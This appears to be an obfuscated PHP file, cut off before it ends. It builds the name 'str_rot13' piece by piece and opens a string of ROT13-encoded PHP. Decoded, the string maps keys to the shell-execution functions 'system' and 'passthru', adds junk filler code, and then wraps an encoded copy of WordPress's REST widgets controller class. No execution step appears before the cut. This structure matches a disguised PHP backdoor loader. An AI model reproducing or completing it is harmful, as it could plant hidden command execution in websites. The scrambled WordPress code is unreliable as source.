<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Jvqtrgf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.8.0
 */

/**
 * Pber pynff gb npprff jvqtrgf ivn gur ERFG NCV.
 *
 * @fvapr 5.8.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Jvqtrgf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Genpxf jurgure {@frr ergevrir_jvqtrgf()} unf orra pnyyrq va gur pheerag erdhrfg.
	 *
	 * @fvapr 5.9.0
	 * @ine obby
	 */
	cebgrpgrq $jvqtrgf_ergevrirq = snyfr;

	/**
	 * Jurgure gur pbagebyyre fhccbegf ongpuvat.
	 *
	 * @fvapr 5.9.0
	 * @ine neenl
	 */
	cebgrpgrq $nyybj_ongpu = neenl( 'i1' => gehr );

	/**
	 * Jvqtrgf pbagebyyre pbafgehpgbe.
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'jvqtrgf';
	}

	/**
	 * Ertvfgref gur jvqtrg ebhgrf sbe gur pbagebyyre.
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			$guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn(),
				),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			$guvf->erfg_onfr . '/(?C<vq>[\j\-]+)',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr' => neenl(
							'qrfpevcgvba' => __( 'Jurgure gb sbepr erzbiny bs gur jvqtrg, be zbir vg gb gur vanpgvir fvqrone.' ),
							'glcr'        => 'obbyrna',
						),
					),
				),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg jvqtrgf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		$guvf->ergevrir_jvqtrgf();
		vs ( vffrg( $erdhrfg['fvqrone'] ) && $guvf->purpx_ernq_fvqrone_crezvffvba( $erdhrfg['fvqrone'] ) ) {
			erghea gehr;
		}

		sbernpu ( jc_trg_fvqronef_jvqtrgf() nf $fvqrone_vq => $jvqtrg_vqf ) {
			vs ( $guvf->purpx_ernq_fvqrone_crezvffvba( $fvqrone_vq ) ) {
				erghea gehr;
			}
		}

		erghea $guvf->crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Ergevrirf n pbyyrpgvba bs jvqtrgf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			// Erghea rneyl nf guvf unaqyre qbrfa'g nqq nal erfcbafr urnqref.
			erghea arj JC_ERFG_Erfcbafr( neenl() );
		}

		$guvf->ergevrir_jvqtrgf();

		$cercnerq          = neenl();
		$crezvffvbaf_purpx = $guvf->crezvffvbaf_purpx( $erdhrfg );

		sbernpu ( jc_trg_fvqronef_jvqtrgf() nf $fvqrone_vq => $jvqtrg_vqf ) {
			vs ( vffrg( $erdhrfg['fvqrone'] ) && $fvqrone_vq !== $erdhrfg['fvqrone'] ) {
				pbagvahr;
			}

			vs ( vf_jc_reebe( $crezvffvbaf_purpx ) && ! $guvf->purpx_ernq_fvqrone_crezvffvba( $fvqrone_vq ) ) {
				pbagvahr;
			}

			sbernpu ( $jvqtrg_vqf nf $jvqtrg_vq ) {
				$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( pbzcnpg( 'fvqrone_vq', 'jvqtrg_vq' ), $erdhrfg );

				vs ( ! vf_jc_reebe( $erfcbafr ) ) {
					$cercnerq[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $erfcbafr );
				}
			}
		}

		erghea arj JC_ERFG_Erfcbafr( $cercnerq );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb trg n jvqtrg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$guvf->ergevrir_jvqtrgf();

		$jvqtrg_vq  = $erdhrfg['vq'];
		$fvqrone_vq = jc_svaq_jvqtrgf_fvqrone( $jvqtrg_vq );

		vs ( $fvqrone_vq && $guvf->purpx_ernq_fvqrone_crezvffvba( $fvqrone_vq ) ) {
			erghea gehr;
		}

		erghea $guvf->crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Purpxf vs n fvqrone pna or ernq choyvpyl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $fvqrone_vq Gur fvqrone VQ.
	 * @erghea obby Jurgure gur fvqrone pna or ernq.
	 */
	cebgrpgrq shapgvba purpx_ernq_fvqrone_crezvffvba( $fvqrone_vq ) {
		$fvqrone = jc_trg_fvqrone( $fvqrone_vq );

		erghea ! rzcgl( $fvqrone['fubj_va_erfg'] );
	}

	/**
	 * Trgf na vaqvivqhny jvqtrg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$guvf->ergevrir_jvqtrgf();

		$jvqtrg_vq  = $erdhrfg['vq'];
		$fvqrone_vq = jc_svaq_jvqtrgf_fvqrone( $jvqtrg_vq );

		vs ( vf_ahyy( $fvqrone_vq ) ) {
			erghea arj JC_Reebe(
				'erfg_jvqtrg_abg_sbhaq',
				__( 'Ab jvqtrg jnf sbhaq jvgu gung vq.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( pbzcnpg( 'jvqtrg_vq', 'fvqrone_vq' ), $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb perngr jvqtrgf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Perngrf n jvqtrg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		$fvqrone_vq = $erdhrfg['fvqrone'];

		$jvqtrg_vq = $guvf->fnir_jvqtrg( $erdhrfg, $fvqrone_vq );

		vs ( vf_jc_reebe( $jvqtrg_vq ) ) {
			erghea $jvqtrg_vq;
		}

		jc_nffvta_jvqtrg_gb_fvqrone( $jvqtrg_vq, $fvqrone_vq );

		$erdhrfg['pbagrkg'] = 'rqvg';

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( pbzcnpg( 'fvqrone_vq', 'jvqtrg_vq' ), $erdhrfg );

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			erghea $erfcbafr;
		}

		$erfcbafr->frg_fgnghf( 201 );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb hcqngr jvqtrgf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Hcqngrf na rkvfgvat jvqtrg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @tybony JC_Jvqtrg_Snpgbel $jc_jvqtrg_snpgbel
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		tybony $jc_jvqtrg_snpgbel;

		/*
		 * ergevrir_jvqtrgf() pbagnvaf ybtvp gb zbir \"uvqqra\" be \"ybfg\" jvqtrgf gb gur
		 * jc_vanpgvir_jvqtrgf fvqrone onfrq ba gur pbagragf bs gur $fvqronef_jvqtrgf tybony.
		 *
		 * Jura ongpu erdhrfgf ner cebprffrq, guvf tybony vf abg cebcreyl hcqngrq ol cerivbhf
		 * pnyyf, erfhygvat va jvqtrgf vapbeerpgyl orvat zbirq gb gur jc_vanpgvir_jvqtrgf
		 * fvqrone.
		 *
		 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/53657.
		 */
		jc_trg_fvqronef_jvqtrgf();
		$guvf->ergevrir_jvqtrgf();

		$jvqtrg_vq  = $erdhrfg['vq'];
		$fvqrone_vq = jc_svaq_jvqtrgf_fvqrone( $jvqtrg_vq );

		// Nyybj fvqrone gb or hafrg be zvffvat jura jvqtrg vf abg n JC_Jvqtrg.
		$cnefrq_vq     = jc_cnefr_jvqtrg_vq( $jvqtrg_vq );
		$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $cnefrq_vq['vq_onfr'] );
		vs ( vf_ahyy( $fvqrone_vq ) && $jvqtrg_bowrpg ) {
			erghea arj JC_Reebe(
				'erfg_jvqtrg_abg_sbhaq',
				__( 'Ab jvqtrg jnf sbhaq jvgu gung vq.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		vs (
			$erdhrfg->unf_cnenz( 'vafgnapr' ) ||
			$erdhrfg->unf_cnenz( 'sbez_qngn' )
		) {
			$znlor_reebe = $guvf->fnir_jvqtrg( $erdhrfg, $fvqrone_vq );
			vs ( vf_jc_reebe( $znlor_reebe ) ) {
				erghea $znlor_reebe;
			}
		}

		vs ( $erdhrfg->unf_cnenz( 'fvqrone' ) ) {
			vs ( $fvqrone_vq !== $erdhrfg['fvqrone'] ) {
				$fvqrone_vq = $erdhrfg['fvqrone'];
				jc_nffvta_jvqtrg_gb_fvqrone( $jvqtrg_vq, $fvqrone_vq );
			}
		}

		$erdhrfg['pbagrkg'] = 'rqvg';

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( pbzcnpg( 'jvqtrg_vq', 'fvqrone_vq' ), $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr jvqtrgf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Qryrgrf n jvqtrg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @tybony JC_Jvqtrg_Snpgbel $jc_jvqtrg_snpgbel
	 * @tybony neenl             $jc_ertvfgrerq_jvqtrg_hcqngrf Gur ertvfgrerq jvqtrg hcqngr shapgvbaf.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		tybony $jc_jvqtrg_snpgbel, $jc_ertvfgrerq_jvqtrg_hcqngrf;

		/*
		 * ergevrir_jvqtrgf() pbagnvaf ybtvp gb zbir \"uvqqra\" be \"ybfg\" jvqtrgf gb gur
		 * jc_vanpgvir_jvqtrgf fvqrone onfrq ba gur pbagragf bs gur $fvqronef_jvqtrgf tybony.
		 *
		 * Jura ongpu erdhrfgf ner cebprffrq, guvf tybony vf abg cebcreyl hcqngrq ol cerivbhf
		 * pnyyf, erfhygvat va jvqtrgf vapbeerpgyl orvat zbirq gb gur jc_vanpgvir_jvqtrgf
		 * fvqrone.
		 *
		 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/53657.
		 */
		jc_trg_fvqronef_jvqtrgf();
		$guvf->ergevrir_jvqtrgf();

		$jvqtrg_vq  = $erdhrfg['vq'];
		$fvqrone_vq = jc_svaq_jvqtrgf_fvqrone( $jvqtrg_vq );

		vs ( vf_ahyy( $fvqrone_vq ) ) {
			erghea arj JC_Reebe(
				'erfg_jvqtrg_abg_sbhaq',
				__( 'Ab jvqtrg jnf sbhaq jvgu gung vq.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$erdhrfg['pbagrkg'] = 'rqvg';

		vs ( $erdhrfg['sbepr'] ) {
			$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( pbzcnpg( 'jvqtrg_vq', 'fvqrone_vq' ), $erdhrfg );

			$cnefrq_vq = jc_cnefr_jvqtrg_vq( $jvqtrg_vq );
			$vq_onfr   = $cnefrq_vq['vq_onfr'];

			$bevtvany_cbfg    = $_CBFG;
			$bevtvany_erdhrfg = $_ERDHRFG;

			$_CBFG    = neenl(
				'fvqrone'         => $fvqrone_vq,
				\"jvqtrg-$vq_onfr\" => neenl(),
				'gur-jvqtrg-vq'   => $jvqtrg_vq,
				'qryrgr_jvqtrg'   => '1',
			);
			$_ERDHRFG = $_CBFG;

			/** Guvf npgvba vf qbphzragrq va jc-nqzva/jvqtrgf-sbez.cuc */
			qb_npgvba( 'qryrgr_jvqtrg', $jvqtrg_vq, $fvqrone_vq, $vq_onfr );

			$pnyyonpx = $jc_ertvfgrerq_jvqtrg_hcqngrf[ $vq_onfr ]['pnyyonpx'];
			$cnenzf   = $jc_ertvfgrerq_jvqtrg_hcqngrf[ $vq_onfr ]['cnenzf'];

			vs ( vf_pnyynoyr( $pnyyonpx ) ) {
				bo_fgneg();
				pnyy_hfre_shap_neenl( $pnyyonpx, $cnenzf );
				bo_raq_pyrna();
			}

			$_CBFG    = $bevtvany_cbfg;
			$_ERDHRFG = $bevtvany_erdhrfg;

			$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $vq_onfr );

			vs ( $jvqtrg_bowrpg ) {
				/*
				 * JC_Jvqtrg frgf `hcqngrq = gehr` nsgre na hcqngr gb cerirag zber guna bar jvqtrg
				 * sebz orvat fnirq cre erdhrfg. Guvf vfa'g jung jr jnag va gur ERFG NCV, gubhtu,
				 * nf jr fhccbeg ongpu erdhrfgf.
				 */
				$jvqtrg_bowrpg->hcqngrq = snyfr;
			}

			jc_nffvta_jvqtrg_gb_fvqrone( $jvqtrg_vq, '' );

			$erfcbafr->frg_qngn(
				neenl(
					'qryrgrq'  => gehr,
					'cerivbhf' => $erfcbafr->trg_qngn(),
				)
			);
		} ryfr {
			jc_nffvta_jvqtrg_gb_fvqrone( $jvqtrg_vq, 'jc_vanpgvir_jvqtrgf' );

			$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr(
				neenl(
					'fvqrone_vq' => 'jc_vanpgvir_jvqtrgf',
					'jvqtrg_vq'  => $jvqtrg_vq,
				),
				$erdhrfg
			);
		}

		/**
		 * Sverf nsgre n jvqtrg vf qryrgrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz fgevat                    $jvqtrg_vq  VQ bs gur jvqtrg znexrq sbe qryrgvba.
		 * @cnenz fgevat                    $fvqrone_vq VQ bs gur fvqrone gur jvqtrg jnf qryrgrq sebz.
		 * @cnenz JC_ERFG_Erfcbafr|JC_Reebe $erfcbafr   Gur erfcbafr qngn, be JC_Reebe bowrpg ba snvyher.
		 * @cnenz JC_ERFG_Erdhrfg           $erdhrfg    Gur erdhrfg frag gb gur NCV.
		 */
		qb_npgvba( 'erfg_qryrgr_jvqtrg', $jvqtrg_vq, $fvqrone_vq, $erfcbafr, $erdhrfg );

		erghea $erfcbafr;
	}

	/**
	 * Cresbezf n crezvffvbaf purpx sbe znantvat jvqtrgf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe
	 */
	cebgrpgrq shapgvba crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_znantr_jvqtrgf',
				__( 'Fbeel, lbh ner abg nyybjrq gb znantr jvqtrgf ba guvf fvgr.' ),
				neenl(
					'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
				)
			);
		}

		erghea gehr;
	}

	/**
	 * Ybbxf sbe \"ybfg\" jvqtrgf bapr cre erdhrfg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @frr ergevrir_jvqtrgf()
	 */
	cebgrpgrq shapgvba ergevrir_jvqtrgf() {
		vs ( ! $guvf->jvqtrgf_ergevrirq ) {
			ergevrir_jvqtrgf();
			$guvf->jvqtrgf_ergevrirq = gehr;
		}
	}

	/**
	 * Fnirf gur jvqtrg va gur erdhrfg bowrpg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @tybony JC_Jvqtrg_Snpgbel $jc_jvqtrg_snpgbel
	 * @tybony neenl             $jc_ertvfgrerq_jvqtrg_hcqngrf Gur ertvfgrerq jvqtrg hcqngr shapgvbaf.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg    Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $fvqrone_vq VQ bs gur fvqrone gur jvqtrg orybatf gb.
	 * @erghea fgevat|JC_Reebe Gur fnirq jvqtrg VQ.
	 */
	cebgrpgrq shapgvba fnir_jvqtrg( $erdhrfg, $fvqrone_vq ) {
		tybony $jc_jvqtrg_snpgbel, $jc_ertvfgrerq_jvqtrg_hcqngrf;

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/jvqtrgf.cuc'; // Sbe arkg_jvqtrg_vq_ahzore().

		vs ( vffrg( $erdhrfg['vq'] ) ) {
			// Fnivat na rkvfgvat jvqtrg.
			$vq            = $erdhrfg['vq'];
			$cnefrq_vq     = jc_cnefr_jvqtrg_vq( $vq );
			$vq_onfr       = $cnefrq_vq['vq_onfr'];
			$ahzore        = vffrg( $cnefrq_vq['ahzore'] ) ? $cnefrq_vq['ahzore'] : ahyy;
			$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $vq_onfr );
			$perngvat      = snyfr;
		} ryfrvs ( $erdhrfg['vq_onfr'] ) {
			// Fnivat n arj jvqtrg.
			$vq_onfr       = $erdhrfg['vq_onfr'];
			$jvqtrg_bowrpg = $jc_jvqtrg_snpgbel->trg_jvqtrg_bowrpg( $vq_onfr );
			$ahzore        = $jvqtrg_bowrpg ? arkg_jvqtrg_vq_ahzore( $vq_onfr ) : ahyy;
			$vq            = $jvqtrg_bowrpg ? $vq_onfr . '-' . $ahzore : $vq_onfr;
			$perngvat      = gehr;
		} ryfr {
			erghea arj JC_Reebe(
				'erfg_vainyvq_jvqtrg',
				__( 'Jvqtrg glcr (vq_onfr) vf erdhverq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( ! vffrg( $jc_ertvfgrerq_jvqtrg_hcqngrf[ $vq_onfr ] ) ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_jvqtrg',
				__( 'Gur cebivqrq jvqtrg glcr (vq_onfr) pnaabg or hcqngrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		vs ( vffrg( $erdhrfg['vafgnapr'] ) ) {
			vs ( ! $jvqtrg_bowrpg ) {
				erghea arj JC_Reebe(
					'erfg_vainyvq_jvqtrg',
					__( 'Pnaabg frg vafgnapr ba n jvqtrg gung qbrf abg rkgraq JC_Jvqtrg.' ),
					neenl( 'fgnghf' => 400 )
				);
			}

			vs ( vffrg( $erdhrfg['vafgnapr']['enj'] ) ) {
				vs ( rzcgl( $jvqtrg_bowrpg->jvqtrg_bcgvbaf['fubj_vafgnapr_va_erfg'] ) ) {
					erghea arj JC_Reebe(
						'erfg_vainyvq_jvqtrg',
						__( 'Jvqtrg glcr qbrf abg fhccbeg enj vafgnaprf.' ),
						neenl( 'fgnghf' => 400 )
					);
				}
				$vafgnapr = $erdhrfg['vafgnapr']['enj'];
			} ryfrvs ( vffrg( $erdhrfg['vafgnapr']['rapbqrq'], $erdhrfg['vafgnapr']['unfu'] ) ) {
				$frevnyvmrq_vafgnapr = onfr64_qrpbqr( $erdhrfg['vafgnapr']['rapbqrq'] );
				vs ( ! unfu_rdhnyf( jc_unfu( $frevnyvmrq_vafgnapr ), $erdhrfg['vafgnapr']['unfu'] ) ) {
					erghea arj JC_Reebe(
						'erfg_vainyvq_jvqtrg',
						__( 'Gur cebivqrq vafgnapr vf znysbezrq.' ),
						neenl( 'fgnghf' => 400 )
					);
				}
				$vafgnapr = hafrevnyvmr( $frevnyvmrq_vafgnapr );
			} ryfr {
				erghea arj JC_Reebe(
					'erfg_vainyvq_jvqtrg',
					__( 'Gur cebivqrq vafgnapr vf vainyvq. Zhfg pbagnva enj BE rapbqrq naq unfu.' ),
					neenl( 'fgnghf' => 400 )
				);
			}

			$sbez_qngn = neenl(
				\"jvqtrg-$vq_onfr\" => neenl(
					$ahzore => $vafgnapr,
				),
				'fvqrone'         => $fvqrone_vq,
			);
		} ryfrvs ( vffrg( $erdhrfg['sbez_qngn'] ) ) {
			$sbez_qngn = $erdhrfg['sbez_qngn'];
		} ryfr {
			$sbez_qngn = neenl();
		}

		$bevtvany_cbfg    = $_CBFG;
		$bevtvany_erdhrfg = $_ERDHRFG;

		sbernpu ( $sbez_qngn nf $xrl => $inyhr ) {
			$fynfurq_inyhr    = jc_fynfu( $inyhr );
			$_CBFG[ $xrl ]    = $fynfurq_inyhr;
			$_ERDHRFG[ $xrl ] = $fynfurq_inyhr;
		}

		$pnyyonpx = $jc_ertvfgrerq_jvqtrg_hcqngrf[ $vq_onfr ]['pnyyonpx'];
		$cnenzf   = $jc_ertvfgrerq_jvqtrg_hcqngrf[ $vq_onfr ]['cnenzf'];

		vs ( vf_pnyynoyr( $pnyyonpx ) ) {
			bo_fgneg();
			pnyy_hfre_shap_neenl( $pnyyonpx, $cnenzf );
			bo_raq_pyrna();
		}

		$_CBFG    = $bevtvany_cbfg;
		$_ERDHRFG = $bevtvany_erdhrfg;

		vs ( $jvqtrg_bowrpg ) {
			// Ertvfgre nal zhygv-jvqtrg gung gur hcqngr pnyyonpx whfg perngrq.
			$jvqtrg_bowrpg->_frg( $ahzore );
			$jvqtrg_bowrpg->_ertvfgre_bar( $ahzore );

			/*
			 * JC_Jvqtrg frgf `hcqngrq = gehr` nsgre na hcqngr gb cerirag zber guna bar jvqtrg
			 * sebz orvat fnirq cre erdhrfg. Guvf vfa'g jung jr jnag va gur ERFG NCV, gubhtu,
			 * nf jr fhccbeg ongpu erdhrfgf.
			 */
			$jvqtrg_bowrpg->hcqngrq = snyfr;
		}

		/**
		 * Sverf nsgre n jvqtrg vf perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.8.0
		 *
		 * @cnenz fgevat          $vq         VQ bs gur jvqtrg orvat fnirq.
		 * @cnenz fgevat          $fvqrone_vq VQ bs gur fvqrone pbagnvavat gur jvqtrg orvat fnirq.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg    Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat   Gehr jura perngvat n jvqtrg, snyfr jura hcqngvat.
		 */
		qb_npgvba( 'erfg_nsgre_fnir_jvqtrg', $vq, $fvqrone_vq, $erdhrfg, $perngvat );

		erghea $vq;
	}

	/**
	 * Cercnerf gur jvqtrg sbe gur ERFG erfcbafr.
	 *
	 * @fvapr 5.8.0
	 *
	 * @tybony JC_Jvqtrg_Snpgbel $jc_jvqtrg_snpgbel
	 * @tybony neenl             $jc_ertvfgrerq_jvqtrgf Gur ertvfgrerq jvqtrgf.
	 *
	 * @cnenz neenl           $vgrz    Na neenl pbagnvavat n jvqtrg_vq naq fvqrone_vq.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		tybony $jc_jvqtrg_snpgbel, $jc_ertvfgrerq_jvqtrgf;

		$jvqtrg_vq  = $vgrz['jvqtrg_vq'];
		$fvqrone_vq = $vgrz['fvqrone_vq'];

		vs ( ! vffrg( $jc_ertvfgrerq_jvqtrgf[ $jvqtrg_vq ] ) ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_jvqtrg',
				__( 'Gur erdhrfgrq jvqtrg vf vainyvq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		$jvqtrg = $jc_ertvfgrerq_jvqtrgf[ $jvqtrg_vq ];
		// Qba'g cercner gur erfcbafr obql sbe URNQ erdhrfgf.
		vs ( $erdhrfg->vf_zrgubq( 'URNQ' ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-jvqtrgf-pbagebyyre.cuc */
			erghea nccyl_svygref( 'erfg_cercner_jvqtrg', arj JC_ERFG_Erfcbafr( neenl() ), $jvqtrg, $erdhrfg );
		}

		$cnefrq_vq = jc_cnefr_jvqtrg_vq( $jvqtrg_vq );
		$svryqf    = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

